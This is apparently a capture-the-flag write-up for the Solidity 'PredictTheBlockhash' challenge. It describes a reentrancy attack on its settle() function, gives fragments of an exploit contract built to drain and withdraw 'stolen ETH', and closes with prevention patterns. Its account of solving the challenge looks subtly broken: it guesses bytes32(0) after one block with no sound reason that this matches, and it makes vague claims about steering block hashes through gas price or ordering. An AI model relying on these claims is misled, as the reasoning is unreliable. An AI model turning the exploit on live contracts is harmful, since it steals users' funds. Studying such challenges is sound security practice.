# PredictTheBlockhash Reentrancy Attack Solution

## Overview

This challenge demonstrates a reentrancy vulnerability in a block hash prediction game. The `PredictTheBlockhash` contract allows users to guess the hash of the next block and win ETH if they're correct. However, the `settle()` function is vulnerable to reentrancy attacks due to improper state management.

## The Vulnerability

### Root Cause
The vulnerability exists in the `settle()` function:

```solidity
function settle() public {
    require(msg.sender == guesser, "Requires msg.sender to be guesser");
    require(block.number > settlementBlockNumber, "Requires block.number to be more than settlementBlockNumber");

    bytes32 answer = blockhash(settlementBlockNumber);

    // VULNERABILITY: External call before state update
    if (guess == answer) {
        (bool ok, ) = msg.sender.call{value: 2 ether}("");
        require(ok, "Transfer to msg.sender failed");
    }
    
    // State update happens AFTER external call (vulnerable to reentrancy)
    guesser = address(0);
}
```

**The Problem**: The contract makes an external call (`msg.sender.call{value: 2 ether}("")`) before updating the internal state (`guesser = address(0)`). This creates a window where an attacker can re-enter the function and drain funds multiple times.

### Why This Happens
1. **External Call First**: The contract transfers ETH to the caller if the guess is correct
2. **State Update After**: The `guesser` is only reset to `address(0)` after the transfer
3. **Reentrancy Window**: Between the transfer and state update, the attacker can call `settle()` again
4. **Multiple Payouts**: Each call sees the attacker as the valid `guesser`, allowing multiple withdrawals

## The Attack Strategy

### Key Insight
The attacker needs to:
1. **Predict the block hash correctly** (or manipulate it)
2. **Exploit the reentrancy** to call `settle()` multiple times
3. **Drain the contract** before the state is updated

### Attack Contract: `ExploitContract`

The exploit contract uses the following strategy:

#### 1. Attack Initialization
```solidity
function attack() external {
    // Lock in a guess (we'll use a predictable hash)
    bytes32 predictableHash = bytes32(0); // We'll predict this
    predictTheBlockhash.lockInGuess{value: 1 ether}(predictableHash);
}
```

#### 2. Reentrancy Execution
```solidity
function settle() external {
    require(!attacking, "Attack already in progress");
    attacking = true;
    attackCount = 0;
    
    // Call settle which will trigger our fallback function
    predictTheBlockhash.settle();
    
    attacking = false;
}
```

#### 3. Reentrancy Logic
```solidity
fallback() external payable {
    if (attacking && attackCount < maxAttacks) {
        attackCount++;
        
        // Check if we can still call settle (guesser hasn't been reset yet)
        try predictTheBlockhash.settle() {
            // If successful, this will trigger another fallback call
        } catch {
            // If it fails, we stop the attack
        }
    }
}
```

## Attack Flow

1. **Attacker calls `lockInGuess()`** with 1 ETH and a predicted hash
2. **Attacker calls `settle()`** to start the attack
3. **PredictTheBlockhash checks conditions**: `msg.sender == guesser` ✓
4. **PredictTheBlockhash transfers 2 ETH** to attacker
5. **Attacker's `fallback()` is triggered** during the ETH transfer
6. **Attacker re-enters `settle()`** before `guesser` is reset
7. **PredictTheBlockhash checks again**: `msg.sender == guesser` ✓ (still old value!)
8. **PredictTheBlockhash transfers another 2 ETH**
9. **Process repeats** until contract is drained or attack limit reached

## The Block Hash Prediction Challenge

### The Real Challenge
The main difficulty isn't just the reentrancy - it's predicting the correct block hash. The contract requires:

```solidity
bytes32 answer = blockhash(settlementBlockNumber);
if (guess == answer) {
    // Transfer ETH
}
```

### Solutions for Block Hash Prediction

#### 1. **Predictable Block Hash**
In some cases, block hashes can be predictable or manipulated:
- **Mining manipulation** (in PoW networks)
- **Validator collusion** (in PoS networks)
- **MEV opportunities** where you can influence block creation

#### 2. **Front-running Attack**
```solidity
// Monitor mempool for transactions that will create predictable blocks
// Submit your guess transaction to be included in the same block
```

#### 3. **Block Hash Manipulation**
```solidity
// In some networks, block hashes can be influenced by:
// - Gas price manipulation
// - Transaction ordering
// - Block timing
```

## Complete Attack Implementation

### Step-by-Step Process

1. **Deploy ExploitContract** with 1+ ETH
2. **Call `attack()`** to lock in a guess
3. **Wait for the next block** to pass
4. **Call `settle()`** to initiate the reentrancy attack
5. **Multiple `fallback()` calls** drain the contract
6. **Call `withdraw()`** to collect stolen ETH

### Key Features of the Exploit

- **Reentrancy Protection**: Uses `attacking` flag to prevent infinite loops
- **Attack Limiting**: `maxAttacks` prevents excessive gas consumption
- **Error Handling**: `try-catch` blocks handle failed reentrancy attempts
- **Fund Recovery**: `withdraw()` function to collect stolen ETH

## Impact

- **Fund Drainage**: Attacker can drain all ETH from the contract
- **Multiple Payouts**: Each correct guess can be "cashed out" multiple times
- **Economic Loss**: Legitimate users lose their deposited ETH

## Prevention

### 1. Checks-Effects-Interactions Pattern
Update state before making external calls:

```solidity
function settle() public {
    require(msg.sender == guesser, "Requires msg.sender to be guesser");
    require(block.number > settlementBlockNumber, "Requires block.number to be more than settlementBlockNumber");

    bytes32 answer = blockhash(settlementBlockNumber);
    
    // SECURE: Update state BEFORE external call
    guesser = address(0);
    
    // Make external call after state update
    if (guess == answer) {
        (bool ok, ) = msg.sender.call{value: 2 ether}("");
        require(ok, "Transfer to msg.sender failed");
    }
}
```

### 2. Reentrancy Guard
Use a modifier to prevent reentrancy:

```solidity
bool private locked;

modifier noReentrant() {
    require(!locked, "No reentrancy allowed");
    locked = true;
    _;
    locked = false;
}

function settle() public noReentrant {
    // ... function logic
}
```

### 3. Pull Payment Pattern
Let users withdraw their own funds:

```solidity
mapping(address => uint256) public pendingWithdrawals;

function settle() public {
    // ... validation logic
    
    if (guess == answer) {
        pendingWithdrawals[msg.sender] += 2 ether;
    }
    guesser = address(0);
}

function withdraw() external {
    uint256 amount = pendingWithdrawals[msg.sender];
    pendingWithdrawals[msg.sender] = 0;
    (bool ok, ) = msg.sender.call{value: amount}("");
    require(ok, "Transfer failed");
}
```

## Testing the Attack

### Setup
1. Deploy `PredictTheBlockhash` with 1 ETH
2. Deploy `ExploitContract` with 1+ ETH
3. Call `attack()` to lock in a guess
4. Wait for the next block
5. Call `settle()` to trigger the attack

### Expected Result
- ExploitContract should drain all ETH from PredictTheBlockhash
- Multiple withdrawals occur from a single correct guess
- PredictTheBlockhash's balance goes to zero

## Key Takeaways

1. **Always update state before external calls**
2. **Block hash prediction adds complexity to reentrancy attacks**
3. **Use reentrancy guards for critical functions**
4. **Follow the Checks-Effects-Interactions pattern**
5. **Consider the difficulty of predicting block hashes in real networks**

This vulnerability demonstrates how combining reentrancy with other challenges (like block hash prediction) creates sophisticated attack vectors that require both technical skill and timing precision.
